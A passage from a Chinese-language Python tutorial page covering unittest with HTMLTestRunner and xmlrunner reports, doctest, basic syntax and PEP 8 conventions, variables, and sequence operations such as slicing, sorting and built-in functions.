        with self.assertRaises(AttributeError): # 通过d.empty访问不存在的key时期待抛出AttributeError
            value = d.empty

### 运行单元测试最简单的运行方式是在mydict_test.py的最后加上两行代码:
if __name__ == '__main__':
    unittest.main()

这样就可以把mydict_test.py当做正常的python脚本运行:
$ python mydict_test.py

另一种方法是在命令行通过参数-m unittest直接运行单元测试:
$ python -m unittest mydict_test
这是推荐的做法,因为这样可以一次批量运行很多单元测试,并且有很多工具可以自动来运行这些单元测试

</textarea><pre>
【 生成测试报告 】
需要自己安装HTMLTestRunner模块,使用执行测试用例就会生成一个html的测试报告,里面会有每个测试用例的执行结果
HTMLTestRunner是Python标准库的unittest模块的扩展,无法通过pip安装;
从http://tungwaiyip.info/software/HTMLTestRunner.html下载HTMLTestRunner.py并将文件放到python3安装目录的Lib下

</pre><textarea>
import HTMLTestRunner
import unittest
class MyTest(unittest.TestCase):#继承unittest.TestCase
    def tearDown(self):
        #每个测试用例执行之后做操作
        print('111')
    def setUp(self):
        #每个测试用例执行之前做操作
        print(22222)
    def test_run(self):
        # self.assertEqual(1,1)
        self.assertIs(1,1)
        #测试用例
    def test_run2(self):
        # self.assertEqual(1,1)
        self.assertIs(1,1)
        #测试用例
    def test_run3(self):
        # self.assertEqual(1,1)
        self.assertIs(1,1)
        #测试用例
    def test_run1(self):
        # self.assertEqual(1,1)
        self.assertIs(1,1)
        #测试用例
if __name__ == '__main__':
    test_suite = unittest.TestSuite()#创建一个测试集合
    test_suite.addTest(MyTest('test_run1'))#测试套件中添加测试用例
    #test_suite.addTest(unittest.makeSuite(MyTest))#使用makeSuite方法添加所有的测试方法
    fp = open('res.html','wb')#打开一个保存结果的html文件
    runner = HTMLTestRunner.HTMLTestRunner(stream=fp,title='api测试报告',description='测试情况') #生成执行用例的对象
    runner.run(test_suite) #执行测试套件

</textarea>如果有很多个模块,每个模块下面都写了很多python文件,每个python文件里面都有测试用例,那怎么把这个目录下的用例都执行了呢,就要先找到这个目录下的所有python文件,然后找到里面的测试用例,逐个执行<textarea>
import unittest,HTMLTestRunner
suite = unittest.TestSuite()#创建测试套件
all_cases = unittest.defaultTestLoader.discover('.','test_*.py')
#找到某个目录下所有的以test开头的Python文件里面的测试用例
for case in all_cases:
    suite.addTests(case)#把所有的测试用例添加进来
fp = open('res.html','wb')
runner = HTMLTestRunner.HTMLTestRunner(stream=fp,title='all_tests',description='所有测试情况')
runner.run(suite) #运行测试

</textarea><pre>
在后续进行持续集成的时候,要让代码自动运行就会用到Jenkins,但上面产生的测试报告都是html格式的,Jenkins不认识,就在Jenkins里面显示不出来。那咱们就要产生一些Jenkins认识的测试报告,Jenkins认识xml格式的报告,那就需要产生xml格式的,就需要用一个新的模块xmlrunner,安装直接 pip install xmlrunner即可

</pre><textarea>
import unittest
import xmlrunner
class My(unittest.TestCase):
    def test1(self,a,b,c):
        self.assertEqual(a+b,c)

if __name__=='__main__':
    test_suite = unittest.TestSuite()
    test_suite.addTest(unittest.makeSuite(My))
    runner = xmlrunner.XMLTestRunner(output='report') #指定xml格式的报告放的目录
    runner.run(test_suite)

</textarea>demo<textarea>
# 编写Student类：
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

class Student(object):

  def __init__(self,name,score):
    self.name = name
    self.score = score

  def get_grade(self):
    if self.score >= 80 and self.score <= 100:
      return 'A'
    elif self.score >= 60 and self.score <= 79:
      return 'B'
    elif self.score >= 0 and self.score <= 59:
      return 'C'
    else:
      raise ValueError('value is not between 0 and 100')

# 编写一个测试类TestStudent,从unittest.TestCase继承：
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import unittest
from student import Student

class TestStudent(unittest.TestCase):

  def test_80_to_100(self):
    s1 = Student('Bart',80)
    s2 = Student('Lisa',100)
    self.assertEqual(s1.get_grade(),'A')
    self.assertEqual(s2.get_grade(),'A')

  def test_60_to_80(self):
    s1 = Student('Bart',60)
    s2 = Student('Lisa',79)
    self.assertEqual(s1.get_grade(),'B')
    self.assertEqual(s2.get_grade(),'B')

  def test_0_to_60(self):
    s1 = Student('Bart',0)
    s2 = Student('Lisa',59)
    self.assertEqual(s1.get_grade(),'C')
    self.assertEqual(s2.get_grade(),'C')

  def test_invalid(self):
    s1 = Student('Bart',-1)
    s2 = Student('Lisa',101)
    with self.assertRaises(ValueError):
      s1.get_grade()
    with self.assertRaises(ValueError):
      s2.get_grade()

#运行单元测试
if __name__ == '__main__':
  unittest.main()

</textarea><pre>
【 命令行界面 】
unittest模块可以通过命令行运行模块、类和独立测试方法的测试,可以传入模块名、类或方法名或他们的任意组合:
python -m unittest test_module1 test_module2
python -m unittest test_module.TestClass
python -m unittest test_module.TestClass.test_method

测试模块可以通过文件路径指定:
python -m unittest tests/test_something.py
这样就可以使用shell的文件名补全指定测试模块。所指定的文件仍需要可以被作为模块导入。路径通过去除'.py'、把分隔符转换为'.'转换为模块名。若需要执行不能被作为模块导入的测试文件,需要直接执行该测试文件。

在运行测试时可以通过添加 -v 参数获取更详细(更多的冗余)的信息。
python -m unittest -v test_module

当运行时不包含参数,开始探索性测试
python -m unittest

用于获取命令行选项列表：
python -m unittest -h

命令行选项,command-line options:
-b, --buffer
在测试运行时标准输出流与标准错误流会被放入缓冲区。成功的测试的运行时输出会被丢弃;测试不通过时测试运行中的输出会正常显示,错误会被加入到测试失败信息。

-c, --catch
当测试正在运行时Control-C会等待当前测试完成,并在完成后报告已执行的测试的结果。当再次按下Control-C时,引发平常的KeyboardInterrupt异常。

-f, --failfast
当出现第一个错误或者失败时停止运行测试。

-k
只运行匹配模式或子串的测试方法和类。可以多次使用这个选项,以便包含匹配子串的所有测试用例。
包含通配符*的模式使用fnmatch.fnmatchcase()对测试名称进行匹配。另外该匹配是大小写敏感的。
模式对测试加载器导入的测试方法全名进行匹配,例如-k foo可以匹配到foo_tests.SomeTest.test_something和bar_tests.SomeTest.test_foo ,但不能匹配到bar_tests.FooTest.test_something

--locals
在回溯中显示局部变量。

命令行亦可用于探索性测试,以运行一个项目的所有测试或其子集。

</pre>
</div>

<div id="doctest">
<h4>文档测试</h4><pre>
很多文档都有示例代码,这些代码与其他说明可以写在注释中,然后由一些工具来自动生成文档。既然这些代码本身就可以粘贴出来直接运行,那么可以自动执行写在注释中的这些代码
注释中的代码明确地告诉函数的调用者该函数的期望输入和输出,并且Python内置的"文档测试"(doctest)模块可以直接提取注释中的代码并执行测试
doctest严格按照Python交互式命令行的输入和输出来判断测试结果是否正确。只有测试异常的时候,可以用...表示中间一大段烦人的输出,什么输出也没有就说明编写的doctest运行都是正确的
当模块正常导入时doctest不会被执行,只有在命令行直接运行时才执行doctest,所以不必担心doctest会在非测试环境下执行
doctest非常有用,不但可用来测试,还可直接作为示例代码。通过某些文档生成工具就可以自动把包含doctest的注释提取出来。用户看文档时也看到了doctest

</pre><textarea>
# mydict2.py
class Dict(dict):
    '''
    Simple dict but also support access as x.y style.

    >>> d1 = Dict()
    >>> d1['x'] = 100
    >>> d1.x
    100
    >>> d1.y = 200
    >>> d1['y']
    200
    >>> d2 = Dict(a=1, b=2, c='3')
    >>> d2.c
    '3'
    >>> d2['empty']
    Traceback (most recent call last):
        ...
    KeyError: 'empty'
    >>> d2.empty
    Traceback (most recent call last):
        ...
    AttributeError: 'Dict' object has no attribute 'empty'
    '''
    def __init__(self, **kw):
        super(Dict, self).__init__(**kw)

    def __getattr__(self, key):
        try:
            return self[key]
        except KeyError:
            raise AttributeError(r"'Dict' object has no attribute '%s'" % key)

    def __setattr__(self, key, value):
        self[key] = value

if __name__=='__main__':
    import doctest
    doctest.testmod()

# 执行:$ python mydict2.py

</textarea>
</div>

<div id="syntax">
<h3>python语法: python严格区分大小写</h3><pre>
计算机要根据编程语言执行任务,就必须保证编程语言写出的程序决不能有歧义,所以任何一种编程语言都有自己的一套语法,编译器或解释器就是负责把符合语法的程序代码转换成CPU能够执行的机器码,然后执行

Python与其他语言最大的区别就是Python的代码块不使用大括号来控制类、函数及其他逻辑判断,而是采用缩进方式,缩进的空白数量是可变的,但所有代码块语句必须包含相同的缩进空白数量,建议在每个缩进层次使用单个制表符或两个空格或四个空格,混用或没有严格缩进时在执行时会报错,按照约定俗成的管理,应该始终坚持使用4个空格的缩进

sublime Settings-User添加:
"tab_size": 4,                              // The number of spaces a tab is considered equal to
"translate_tabs_to_spaces": true,           // Set to true to insert spaces when tab is pressed
"expand_tabs_on_save": true,                // 设置保存时自动转换
"draw_white_space": "all",                  // 显示空白字符
"trim_trailing_white_space_on_save": true,  // 设置保存的时候,自动去除行尾的空白字符

sublime执行python语句
ctrl+~进入python解释器可执行python命令

以#开头的语句是任意内容的注释,解释器会忽略掉注释,其他每一行都是一个语句,当语句以冒号:结尾时缩进的语句视为代码块

</pre><textarea>
#!/usr/bin/python
# -*- coding: UTF-8 -*-
# 文件名:test.py

if True:
    print("Answer")
    print("True")
else:
    print("Answer")
    # 没有严格缩进,在执行时会报错:IndentationError: unindent does not match any outer indentation level
  print("False")

</textarea><pre>
【 if __name__ == '__main__': 】
在python模块中通常会写上一行if __name__ == '__main__':作为程序入口
python模块通常有两种运行方式：第一种作为脚本直接运行,第二种被import导入到其他python模块中,if __name__ == '__main__'的作用就是控制这两种情况代码执行过程,下面的代码只有在第一种情况下才会被执行,而import时不会被执行
__name__是标识模块的名字的一个系统变量,当.py直接运行的时候__name__的值是__main__,而当.py被当作模块导入时__name__的值是模块的名称

命令行运行hello模块文件时Python解释器把一个特殊变量__name__置为__main__,而如果在其他地方导入该hello模块时,if判断将失败,因此这种if测试可以让一个模块通过命令行运行时执行一些额外的代码,最常见的就是运行测试

所以你的.py可以作为自己的脚本运行,在main中做一些测试或者本身程序的运行,当然也可以使用你的.py作为模块给别人使用,给别人提供一些便利,为了不让别人一导入你的模块,就直接运行整个脚本,使用if __name__ == '__main__'

</pre><textarea>
# hello.py
name = 'admin'
print('name: ', name)

def main():
    print('__name__: ', __name__)

if __name__ == '__main__':
    main()

# 输出
# name:  admin
# __name__:  __main__

# test.py
import hello
hello.main()

# 输出
# name:  admin
# __name__:  hello

</textarea><pre>
【 Python标识符 】
Python标识符由字母、数字、下划线组成,但不能以数字开头,区分大小写的。

下划线开头的标识符有特殊意义
以单下划线开头_foo的代表不能直接访问的类属性,需通过类提供的接口进行访问,不能用fromxxx import *导入
以双下划线开头的__foo代表类的私有成员
以双下划线开头和结尾的__foo__代表Python里特殊方法专用的标识,如__init__()代表类的构造函数

【 Python保留字符 】
保留字是Python语言中一些已经被赋予特定意义的单词,要求开发者在开发程序时不能用这些保留字作为标识符给变量、函数、类、模板及其他对象命名

Python包含的保留字可以执行如下命令进行查看:
>>> import keyword
>>> keyword.kwlist
['False', 'None', 'True', 'and', 'as', 'assert', 'break', 'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'nonlocal', 'not', 'or', 'pass', 'raise', 'return', 'try', 'while', 'with', 'yield']

【 多个语句构成代码组 】
缩进相同的一组语句构成一个代码块称之代码组
像if、while、def和class这样的复合语句,首行以关键字开始,以冒号( : )结束,该行之后的一行或多行代码构成代码组,首行及后面的代码组称为一个子句(clause)。

</pre><textarea>
if expression :
   suite
elif expression :
   suite
else :
   suite

</textarea><pre>
【 多行语句 】
Python语句中一般以新行作为语句的结束符,但可以用斜杠\将一行的语句分为多行显示,语句中包含[]、{}或()括号就不需要使用多行连接符
Python可以同一行显示多条语句,方法是用分号分开
>>> print('hello');print('runoob');

</pre><textarea>
total = item_one + \
        item_two + \
        item_three

days = ['Monday', 'Tuesday', 'Wednesday',
        'Thursday', 'Friday']

</textarea><pre>
【 Python引号 】
Python可使用单引号、双引号、三引号('''或""")表示字符串,三引号可由多行组成,编写多行文本的快捷语法,常用于文档字符串,在文件的特定地点被当做注释。

</pre><textarea>
word = 'word'
sentence = "这是一个句子。"
paragraph = """这是一个段落。
包含了多个语句"""

</textarea><pre>
【 Python注释 】
python中单行注释采用#开头,注释可以在语句或表达式行末

</pre><textarea>
#!/usr/bin/python
# -*- coding: UTF-8 -*-
# 文件名:test.py

# 第一个注释
print("Hello, Python!")  # 第二个注释

</textarea>多行注释使用三个单引号(''')或三个双引号("""),通常用来为Python文件、模块、类或函数等添加版权、功能描述等信息<textarea>
#!/usr/bin/python
# -*- coding: UTF-8 -*-
# 文件名:test.py

'''
这是多行注释,使用单引号。
这是多行注释,使用单引号。
'''

"""
这是多行注释,使用双引号。
这是多行注释,使用双引号。
"""

</textarea><pre>
【 Python空行 】
函数之间或类的方法之间用空行分隔,表示一段新的代码的开始。类和函数入口之间也用一行空行分隔,以突出函数入口的开始。

空行与代码缩进不同,空行并不是Python语法的一部分。书写时不插入空行,Python解释器运行也不会出错,但空行的作用在于分隔两段不同功能或含义的代码,便于日后代码的维护或重构。

空行也是程序代码的一部分。

【 编码规范 】
Python采用PEP 8作为编码规范,PEP是Python Enhancement Proposal(Python增强建议书)的缩写,8代表的是Python代码的样式指南

1、每个import语句只导入一个模块,尽量避免一次导入多个模块
#推荐
import os
import sys
#不推荐
import os,sys

2、不要在行尾添加分号,也不要用分号将两条命令放在同一行
#不推荐
height=float(input("输入身高:")); weight=fioat(input("输入体重:"));

3、建议每行不超过80个字符,如果超过建议使用小括号将多行内容隐式的连接起来,而不推荐使用反斜杠\进行连接
#推荐
s=("C语言中文网是中国领先的C语言程序设计专业网站,"
"提供C语言入门经典教程、C语言编译器、C语言函数手册等。")
#不推荐
s="C语言中文网是中国领先的C语言程序设计专业网站,\
提供C语言入门经典教程、C语言编译器、C语言函数手册等。"

此编程规范适用于绝对大多数情况,但以下2种情况除外:
导入模块的语句过长。
注释里的URL。

4、使用必要的空行可增加代码的可读性,通常在顶级定义如函数或类的定义之间空两行,而方法定义之间空一行,在用于分隔某些功能的位置也可以空一行

5、通常在运算符两侧、函数参数之间以及逗号两侧都建议使用空格进行分隔

</pre>
</div>

<div id="var_type">
<h3>python变量和对象类型</h3><pre>
所有编程语言的第一个功能肯定是定义变量,变量是编程的起始点,程序用到的各种数据都是存储在变量内的。

Python是一门弱类型语言,弱类型包含两方面的含义:
1、所有的变量无须声明即可使用,或者说对从未用过的变量赋值就是声明了应变量;
2、变量的数据类型可以随时改变,同一个变量可以一会儿是数值型,一会儿是字符串型。

变量存储在内存中的值,这就意味着在创建变量时会在内存中开辟一个空间。
基于变量的数据类型,解释器会分配指定内存,并决定什么数据可以被存储在内存中。
因此变量可以指定不同的数据类型,这些变量可以存储整数、小数或字符等任意数据类型

【 变量赋值 】
Python中的变量赋值不需要类型声明,可以把任意数据类型赋值给变量,同一个变量可以反复赋值,而且可以是不同类型的变量
这种变量本身类型不固定的语言称之为动态语言,与之对应的是静态语言,静态语言在定义变量时必须指定变量类型,如果赋值的时候类型不匹配就会报错,如Java是静态语言

每个变量在内存中创建,都包括变量的标识、名称和数据这些信息。
每个变量在使用前都必须赋值,变量赋值以后该变量才会被创建。
等号用来给变量赋值,等号运算符左边是一个变量名,等号运算符右边是存储在变量中的值

a = 'ABC'时Python解释器干了两件事情:
1、在内存中创建了一个'ABC'的字符串
2、在内存中创建了一个名为a的变量,并把它指向'ABC'

把一个变量a赋值给另一个变量b,这个操作实际上是把变量b指向变量a所指向的数据
a = 'ABC' # 解释器创建了字符串'ABC'和变量a,并把a指向'ABC'
b = a     # 解释器创建了变量b,并把b指向a指向的字符串'ABC'
a = 'XYZ' # 解释器创建了字符串'XYZ',并把a的指向改为'XYZ',但b并没有更改
print(b)  # ABC

counter = 100  # 赋值整型变量
miles = 1000.0 # 浮点型
name = "John"  # 字符串

同时为多个变量赋值
a = b = c = 1           # 创建一个整型对象,值为1,三个变量被分配到相同的内存空间上。

为多个对象指定多个变量
a, b, c = 1, 2, "john"  # 两个整型对象1和2分别分配给变量a和b,字符串对象"john"分配给变量c

【 常量 】
常量就是不能变的变量,比如常用的数学常数π就是一个常量,在Python中通常用全部大写的变量名表示常量:
PI = 3.14159265359
但事实上PI仍然是一个变量,Python根本没有任何机制保证PI不会被改变,所以用全部大写的变量名表示常量只是一个习惯上的用法

【 数据类型 】
计算机能处理的远不止数值,还可以处理文本、图形、音频、视频、网页等各种各样的数据,不同的数据需要定义不同的数据类型

空值
空值是Python里一个特殊的值,用None表示。None不能理解为0,因为0是有意义的,而None是一个特殊的空值
print(type(None))    # < class 'NoneType'>
a = None
print(a)             # None

标准数据类型
在内存中存储的数据可以有多种类型,Python定义了五个标准的数据类型,用于存储各种类型的数据。
Numbers(数字)
String(字符串)
List(列表)
Tuple(元组)
Dictionary(字典)

列表(list)和元组(tuple)比较相似,都按顺序保存元素,每个元素都有自己的索引,因此列表和元组都可通过索引访问元素,区别在于元组不可修改,列表可修改
字典(dict)和集合(set)类似,它们存储的数据都是无序的,其中字典是用key-value的形式保存数据

</pre>
</div>

<div id="seq">
<h4>序列</h4><pre>
序列指一块可存放多个值的连续内存空间,这些值按一定顺序排列
Python中序列类型包括字符串、bytes、列表、元组、集合和字典,这些序列支持索引、切片、加、乘、检查成员几种通用的操作,但集合和字典不支持索引、切片、相加和相乘操作
Python已经内置确定序列的长度以及确定最大和最小的元素的方法

【 序列索引 】
python的序列有2种取值顺序:
从左到右索引默认0开始的,第一个索引是0,第二个索引是1,依此类推,最大范围是序列长度少1
从右到左索引默认-1开始的,此类索引是从右向左计数,从最后一个元素开始计数,-1表示最后一个元素,最大范围是序列开头,-0和0是一样的,所以负数索引从-1开始

</pre><textarea>
+---+---+---+---+---+---+
 | P | y | t | h | o | n |
 +---+---+---+---+---+---+
 0   1   2   3   4   5   6
-6  -5  -4  -3  -2  -1

>>> word = 'Python'
>>> word[0]   # 'P'
>>> word[5]   # 'n'
>>> word[-1]  # 'n'
>>> word[-2]  # 'o'
>>> word[-6]  # 'P'
>>> print(str[0], "==", str[-6])
>>> print(str[5], "==", str[-1])

>>> # 使用过大的索引会产生一个错误
>>> word[42]   # IndexError: string index out of range

</textarea><pre>
【 序列切片 】
切片操作是访问序列中元素的另一种方法,它可以访问一定范围内的元素,通过切片操作可以生成一个新的序列来截取序列

序列实现切片操作的语法格式:
sname[start : end : step]
sname:表示序列的名称;
start:头下标,表示切片的开始索引位置(包括该位置),不指定则默认0表示从序列的开头进行切片
end:尾下标,表示切片的结束索引位置(不包括该位置),不指定则默认为序列的长度,-1表示最后一个元素
step:表示在切片过程中隔几个存储位置(包含当前位置)取一次元素,如果step的值大于1则在进行切片序列元素时会跳跃式的取元素。如果省略设置step的值则最后一个冒号就可以省略,步长为负数实际上指明了一个逆向迭代器,step为0会报错

切片的开始总是被包括在结果中,而结束不被包括,所以字符串切片时s[:i] + s[i:]总是等于
对于使用非负索引的切片,如果索引不越界,那么得到的切片长度就是起止索引之差。例如word[1:3]的长度为2

</pre><textarea>
word = 'Python'
print(word[0:2])  # 'Py'
print(word[2:5])  # 'tho'

print(word[:2])   # 'Py'
print(word[4:])   # 'on'
print(word[-2:])  # 'on'
print(word[:-1])  # 'Pytho'

print(word[:2] + word[2:])  # 'Python'
print(word[:4] + word[4:])  # 'Python'

# 隔1个字符取一个字符,区间是整个字符串
print(word[::2])   # Pto

# 取整个字符串,此时[]中只需一个冒号即可
print(word[:])     # Python

# 切片中的越界索引不报错会被自动处理
print(word[4:42])  # 'on'
print(word[42:])   # ''

# 切片操作的三个参数可以用表达式
print(word[3%2:2*3+1]) # ython

# 连续切片操作
print(word[3%2:][:2*3+1]) # ython

</textarea>[::-1]序列反转倒序<textarea>
l = ['a', 'b', 'c']   # 倒取每一个元素
print(l[::-1])   # ['c', 'b', 'a']

s = 'Hello World!'
print(s[::-1])        # !dlroW olleH,倒取每一个元素
print(s[::-2])        # !lo le,逆向倒数,每两个取一个

# 检查回文字符串
s = '12345678900987654321'
print(s == s[::-1])

</textarea><textarea>
>>> a = [0, 1, 2, 3, 4, 5]
>>> b = ['a', 'b']
>>> a[2:2] = b
>>> a
[0, 1, 'a', 'b', 2, 3, 4, 5]
>>> a[3:6] = b
>>> a
[0, 1, 'a', 'a', 'b', 4, 5]

</textarea><pre>
class slice(stop)
class slice(start, stop[, step])
返回一个表示由range(start, stop, step)所指定索引集的slice对象,start和step参数默认为None。
切片对象具有仅会返回对应参数值或其默认值的只读数据属性start,stop和step。它们没有其他的显式功能;不过它们会被NumPy以及其他第三方扩展所使用。切片对象也会在使用扩展索引语法时被生成。 例如a[start:stop:step]或a[start:stop, i]

【 序列相加 】
Python中支持两种类型相同的序列使用"+"运算符做相加操作,它会将两个序列进行连接,但不会去除重复的元素。
类型相同指的是+运算符的两侧序列要么都是序列类型,要么都是元组类型,要么都是字符串。

</pre><textarea>
str="c.biancheng.net"
print("学习" + "网址:" + str)       # 学习网址:c.biancheng.net
print("学习" + "网址:" + str[2:-4]) # 学习网址:biancheng

</textarea><pre>
【 序列相乘 】
Python中使用数字n乘以一个序列会生成新的序列,其内容为原来序列被重复n次的结果

</pre><textarea>
print('*'*10 + ' 开始测试 ' + '*'*10)
str="C语言中文网"
print(str*3)  # 'C语言中文网C语言中文网C语言中文网'

</textarea>列表类型在进行乘法运算时还可以实现初始化指定长度列表的功能<textarea>
# 列表的创建用[],创建一个长度为5的列表,列表中的每个元素都是None表示什么都没有
list = [None]*5
print(list)     # [None, None, None, None, None]

</textarea><pre>
【 成员运算符检查元素是否包含在序列中 】
Python中可以使用in关键字检查某元素是否为序列的成员,not in关键字检查某个元素是否不包含在指定的序列中
value in sequence

</pre><textarea>
# 检查字符c是否包含在字符串c.biancheng.net中
str="c.biancheng.net"
print('c' in str)      # True
print('c' not in str)  # False

</textarea><pre>
【 和序列相关的内置函数 】
len(s)
返回对象的长度即元素个数,实参可以是序列如string、bytes、tuple、list或range等或集合如dictionary、set或frozen set等

max(iterable, *[, key, default])
max(arg1, arg2, *args[, key])
返回可迭代对象中最大的元素,或返回两个及以上实参中最大的。
如果只提供了一个位置参数,它必须是非空iterable,返回可迭代对象中最大的元素;如果提供了两个及以上的位置参数则返回最大的位置参数。
有两个可选只能用关键字的实参
key实参指定排序函数用的参数,如传给list.sort()的
default实参是当可迭代对象为空时返回的值。如果可迭代对象为空且没有给default则会触发ValueError
如果有多个最大元素则此函数将返回第一个找到的。这和其他稳定排序工具如sorted(iterable, key=keyfunc, reverse=True)[0]和heapq.nlargest(1, iterable, key=keyfunc)保持一致。

</pre>根据元素频率取列表中最常见的元素<textarea>
def most_frequent(list):
    return max(set(list), key = list.count)
list = [1,2,1,2,3,2,1,4,2]
print(most_frequent(list))  # 2

</textarea><pre>
min(iterable, *[, key, default])
min(arg1, arg2, *args[, key])
返回可迭代对象中最小的元素,或返回两个及以上实参中最小的。
如果只提供了一个位置参数,它必须是iterable,返回可迭代对象中最小的元素;如果提供了两个及以上的位置参数则返回最小的位置参数。

有两个可选只能用关键字的实参
key实参指定排序函数用的参数,如传给list.sort()的
default实参是当可迭代对象为空时返回的值。如果可迭代对象为空且没有给default则会触发ValueError
如果有多个最小元素,则此函数将返回第一个找到的。这和其他稳定排序工具如sorted(iterable, key=keyfunc)[0]和heapq.nsmallest(1, iterable, key=keyfunc)保持一致

</pre><textarea>
s = "c.biancheng.net"
# 找出最大的字符
print(max(s))     # t
# 找出最小的字符
print(min(s))     # .

</textarea><pre>
list()
将序列转换为列表,调用list类型的构造函数

str()
将序列转换为字符串,调用str类型的构造函数

sum(iterable[, start])
计算序列元素和,对序列使用sum()函数时做加和操作的必须都是数字,不能是字符或字符串,否则该函数将抛出异常,因为解释器无法判定是要做连接操作还是做加和操作。
从start开始自左向右对iterable中的项求和并返回总计值,start默认为0,iterable的项通常为数字,开始值则不允许为字符串。
对某些用例来说,存在sum()的更好替代,拼接字符串序列的更好更快方式是调用''.join(sequence)。 要以扩展精度对浮点值求和请参阅math.fsum()。 要拼接一系列可迭代对象请考虑使用itertools.chain()

oldlist = [[1, 2, 3], [4, 5]]
newlist = sum(oldlist,[])  # [1, 2, 3, 4, 5]
# oldlist中的子列表逐一与第二个参数相加,而列表的加法相当于 extend 操作,所以最终结果是由 [] 扩充成的列表

enumerate(iterable, start=0)
将序列组合为一个索引序列,多用在for循环中。
返回一个枚举对象。iterable必须是一个序列,或iterator,或其他支持迭代的对象。 enumerate()返回的迭代器的__next__()方法返回一个元组,里面包含一个计数值(从start开始,默认为0)和通过迭代iterable获得的值。

</pre><textarea>
seasons = ['Spring', 'Summer', 'Fall', 'Winter']
print(enumerate(seasons))                # < enumerate object at 0x0000019FF6802CC8>
print(list(enumerate(seasons)))          # [(0, 'Spring'), (1, 'Summer'), (2, 'Fall'), (3, 'Winter')]
print(list(enumerate(seasons, start=1))) # [(1, 'Spring'), (2, 'Summer'), (3, 'Fall'), (4, 'Winter')]
print(list(enumerate(seasons, 1)))       # [(1, 'Spring'), (2, 'Summer'), (3, 'Fall'), (4, 'Winter')]

for idx, value in enumerate(seasons):
    print('idx={}, value={}'.format(idx, value))
'''
idx=0, value=Spring
idx=1, value=Summer
idx=2, value=Fall
idx=3, value=Winter
'''

# 等价于:
def enumerate(sequence, start=0):
    n = start
    for elem in sequence:
        yield n, elem
        n += 1

</textarea><pre>
reversed(seq)
返回一个反向的iterator,该函数对参数本身不会产生任何影响,seq必须是一个具有__reversed__()方法的对象或是支持该序列协议,即具有从0开始的整数类型参数的__len__()方法和__getitem__()方法

sorted(iterable, *, key=None, reverse=False)
根据iterable中的项返回一个新的已排序列表。在Py3.0中cmp参数被完全删除
具有两个可选参数,它们都必须指定为关键字参数。
key指定带有单个参数的函数,用于从iterable的每个元素中提取用于比较的键如key=str.lower,默认值为None即直接比较元素
reverse为一个布尔值,设为True则每个列表元素将按反向顺序比较进行排序,默认升序排序
使用functools.cmp_to_key()可将老式的cmp函数转换为key函数
key形参的值应该是一个函数,它接受一个参数并并返回一个用于排序的键。这种技巧速度很快,因为对于每个输入记录只会调用一次key函数

内置的sorted()确保是稳定的,如果一个排序确保不会改变比较结果相等的元素的相对顺序就称其为稳定的,这有利于进行多重排序,例如先按部门、再按薪级排序

</pre><textarea>
# 对字符串中的元素进行排序
print(sorted(s))                 # ['.', '.', 'a', 'b', 'c', 'c', 'e', 'e', 'g', 'h', 'i', 'n', 'n', 'n', 't']

# 可选的reverse参数设置为True则表示反向排序
print(sorted(s, reverse = True)) # ['t', 'n', 'n', 'n', 'i', 'h', 'g', 'e', 'e', 'c', 'c', 'b', 'a', '.', '.']

# 可选的参数可指定一个函数来生成排序的关键值。比如希望根据字符串长度排序则可为key参数传入len函数
b = ['fkit', 'crazyit', 'charlie', 'fox', 'Emily']
print(sorted(b, key = len))      # ['fox', 'fkit', 'Emily', 'crazyit', 'charlie']

# 不区分大小写的字符串比较
print(sorted("This is a test string from Andrew".split(), key=str.lower))
# ['a', 'Andrew', 'from', 'is', 'string', 'test', 'This']

# 一种常见的模式是使用对象的一些索引作为键对复杂对象进行排序
student_tuples = [('john', 'A', 15), ('jane', 'B', 12), ('dave', 'B', 10)]
print(sorted(student_tuples, key=lambda student: student[2]))  # sort by age
[('dave', 'B', 10), ('jane', 'B', 12), ('john', 'A', 15)]

# 同样的技术也适用于具有命名属性的对象
class Student:
    def __init__(self, name, grade, age):
        self.name = name
        self.grade = grade
        self.age = age
    def __repr__(self):
        return repr((self.name, self.grade, self.age))
student_objects = [
    Student('john', 'A', 15),
    Student('jane', 'B', 12),
    Student('dave', 'B', 10),
]
print(sorted(student_objects, key=lambda student: student.age))   # sort by age
# [('dave', 'B', 10), ('jane', 'B', 12), ('john', 'A', 15)]

</textarea><pre>
Operator模块函数
上面显示的键函数模式非常常见,因此Python提供了便利功能,使访问器功能更容易,更快捷。 operator模块有itemgetter()、attrgetter()和methodcaller()函数。

</pre><textarea>
from operator import itemgetter, attrgetter
print(sorted(student_tuples, key=itemgetter(2)))
# [('dave', 'B', 10), ('jane', 'B', 12), ('john', 'A', 15)]

print(sorted(student_objects, key=attrgetter('age')))
# [('dave', 'B', 10), ('jane', 'B', 12), ('john', 'A', 15)]

# Operator模块功能允许多级排序。 例如按grade排序,然后按age排序:
print(sorted(student_tuples, key=itemgetter(1,2)))
# [('john', 'A', 15), ('dave', 'B', 10), ('jane', 'B', 12)]

print(sorted(student_objects, key=attrgetter('grade', 'age')))
# [('john', 'A', 15), ('dave', 'B', 10), ('jane', 'B', 12)]

</textarea><pre>
排序稳定性和排序复杂度

</pre><textarea>
# 排序保证是稳定的,这意味着当多个记录具有相同的键值时将保留其原始顺序
print(sorted([('red', 1), ('blue', 1), ('red', 2), ('blue', 2)], key=itemgetter(0)))
# [('blue', 1), ('blue', 2), ('red', 1), ('red', 2)]

# 这个美妙的属性允许在一系列排序步骤中构建复杂的排序。例如要按grade降序然后age升序对学生数据进行排序,请先age排序,然后再使用grade排序:
s = sorted(student_objects, key=attrgetter('age'))     # sort on secondary key
print(sorted(s, key=attrgetter('grade'), reverse=True))       # now sort on primary key, descending
# [('dave', 'B', 10), ('jane', 'B', 12), ('john', 'A', 15)]

</textarea>
</div>

<div id="number">
<h4>Python Number 数值类型(整形、浮点型和复数)</h4><pre>
数字数据类型用于存储数值,他们是不可改变的数据类型,这意味着改变数字数据类型会分配一个新的对象,如果改变Number数据类型的值将重新分配内存空间

Python中这些数值类型都是不可改变的,也就是说如果要修改数字类型变量的值,那么其底层实现的过程是,先将新值存放到内存中,然后修改变量让其指向新的内存地址,换句话说Python中修改数值类型变量的值,其实只是修改变量名所表示的内存空间。

变量赋值时Number对象就会被创建:
var1 = 1
var2 = 10

可以通过使用del语句删除单个或多个对象的引用
del var
del var_a, var_b

Python支持几种不同的数字类型:
1、int: 整形专门用来表示整数,即没有小数部分的数,整数包括正整数、0和负整数
Python的整型支持存储各种整数值,无论多大或者多小Python都能轻松处理,当所用数值超过计算机自身的计算功能时,Python会自动转用高精度计算
